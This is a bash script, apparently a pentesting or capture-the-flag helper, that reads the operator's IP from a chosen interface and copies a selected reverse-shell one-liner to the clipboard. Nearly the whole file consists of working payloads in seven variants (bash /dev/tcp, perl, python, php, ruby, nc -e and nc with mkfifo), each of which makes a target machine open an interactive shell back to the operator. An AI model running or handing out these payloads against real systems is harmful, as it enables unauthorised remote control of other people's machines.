#!/bin/bash

#Colours
declare -r greenColour="\e[0;32m\033[1m"
declare -r endColour="\033[0m\e[0m"
declare -r redColour="\e[0;31m\033[1m"
declare -r blueColour="\e[0;34m\033[1m"
declare -r yellowColour="\e[0;33m\033[1m"
declare -r purpleColour="\e[0;35m\033[1m"
declare -r turquoiseColour="\e[0;36m\033[1m"
declare -r grayColour="\e[0;37m\033[1m"

trap ctrl_c INT

# Ctrl + c
function ctrl_c(){
    echo -e "\n\n${redColour}[!] Exiting...${endColour}"
    exit 1
}


msg="${redColour}\n[+]${endColour} ${purpleColour}Revshell copied to clipboard!${endColour}\n"

if [ $# != 2 ]; then
    echo -e "\n${redColour}[-]${turquoiseColour} Usage: $0 <INTERFACE> <PORT>\n"
    exit
fi

command -v xclip >/dev/null 2>&1 || { echo >&2 -e "${redColour}[-] ${turquoiseColour}xclip is required but is not installed. Aborting."${endColour}; exit 1; }

INT=$1
PORT=$2
IP=$(/usr/bin/ip addr show $INT | grep inet | head -n1 | awk '{ print $2 }' | cut -d / -f 1)

if [ $# -eq 2 ]; then
    echo -e ${redColour}"\n[+] ${purpleColour}Reverse Shells:\n"
    echo -e ${turquoiseColour}"\t1. ${greenColour}bash"
    echo -e ${turquoiseColour}"\t2. ${greenColour}perl"
    echo -e ${turquoiseColour}"\t3. ${greenColour}python"
    echo -e ${turquoiseColour}"\t4. ${greenColour}php"
    echo -e ${turquoiseColour}"\t5. ${greenColour}ruby"
    echo -e ${turquoiseColour}"\t6. ${greenColour}nc"
    echo -e ${turquoiseColour}"\t7. ${greenColour}nc-mkfifo"
    echo -e -n ${turquoiseColour}"\nEnter the no. of the shell: "${endColour}
    read shellno
fi

if [[ $shellno == "1" ]]; then
    echo -e $msg
    echo -e "bash -i >& /dev/tcp/$IP/$PORT 0>&1" | tee /dev/tty | xclip -sel clip

elif [[ $shellno == "2" ]]; then
    echo -e $msg
    echo -e "perl -e 'use Socket;$i=\"$IP\";$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" | tee /dev/tty | xclip -sel clip

elif [[ $shellno == "3" ]]; then
    echo -e $msg
    echo -e "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" | tee /dev/tty | xclip -sel clip

elif [[ $shellno == "4" ]]; then
    echo -e $msg
    echo -e "php -r '$sock=fsockopen(\"$IP\",$PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" | tee /dev/tty | xclip -sel clip

elif [[ $shellno == "5" ]]; then
    echo -e $msg
    echo -e "ruby -rsocket -e 'f=TCPSocket.open(\"$IP\",$PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" | tee /dev/tty | xclip -sel clip

elif [[ $shellno == "6" ]]; then
    echo -e $msg
    echo -e "nc -e /bin/sh $IP $PORT" | tee /dev/tty | xclip -sel clip

elif [[ $shellno == "7" ]]; then
    echo -e $msg
    echo -e "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f" | tee /dev/tty | xclip -sel clip

else
    echo -e "\n${redColour}[-] ${turquoiseColour}Invalid option\n${endColour}"
    fi
